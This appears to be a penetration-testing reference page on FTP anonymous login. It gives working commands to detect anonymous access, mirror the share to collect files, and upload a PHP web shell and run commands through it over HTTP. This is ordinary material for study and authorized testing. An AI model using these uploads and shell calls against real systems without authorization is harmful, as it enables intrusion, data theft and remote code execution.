---
title: "Anonymous access: the built-in FTP anonymous login"
description: "FTP defines an anonymous login (user anonymous or ftp with any password) that many servers enable. It grants access to whatever the anonymous root exposes: readable files to loot, and, where the server permits anonymous uploads, a writable directory that may be served by a co-located web server or processed by a backend, turning upload into code execution."
keywords:
  - ftp anonymous
  - anonymous upload
  - ftp
  - webroot
  - loot
---

# Anonymous access

FTP has a standard anonymous login: the username `anonymous` (or `ftp`) with any string, often an email, as the password. Many servers enable it, exposing whatever directory is configured as the anonymous root. Read access there is immediate loot; more dangerously, some servers allow anonymous uploads, and a writable FTP directory frequently coincides with a path that something else acts on, a web server's document root, a directory a scheduled job ingests, so an upload becomes code execution or data injection.

```bash
# confirm and use anonymous access
nmap -p21 --script ftp-anon <target>          # reports if anonymous is allowed and dir listing
ftp <target>        # login: anonymous / <any>  (or:)
curl -s ftp://<target>/ --user anonymous:a     # list the anonymous root
# download everything for offline loot
wget -r --no-parent ftp://anonymous:a@<target>/
# test for writable upload
curl -T shell.php ftp://<target>/ --user anonymous:a && echo "upload allowed"
```

## Upload to execution

```bash
# if the FTP root is also a webroot (common on combined web/FTP hosts),
# an uploaded script runs when requested over HTTP
curl -T shell.php ftp://<target>/ --user anonymous:a
curl http://<target>/shell.php?cmd=id          # if served by a co-located web server
```

## Exploitation notes

- Always try anonymous first; `ftp-anon` reports both whether it is allowed and a directory listing, which immediately shows the loot.
- A writable anonymous directory is the high-value case: test upload, then determine whether the path is served by a web server or consumed by a backend, which converts the write into execution.
- Even read-only anonymous access often exposes configuration, backups, and source that advance the intrusion; mirror the tree and mine it like any share.
- Credentials and files cross the wire in cleartext, so anonymous FTP data is also capturable passively on a shared network.

## References

- [nmap ftp-anon](https://nmap.org/nsedoc/scripts/ftp-anon.html)
- [HackTricks: FTP anonymous](https://book.hacktricks.xyz/network-services-pentesting/pentesting-ftp)
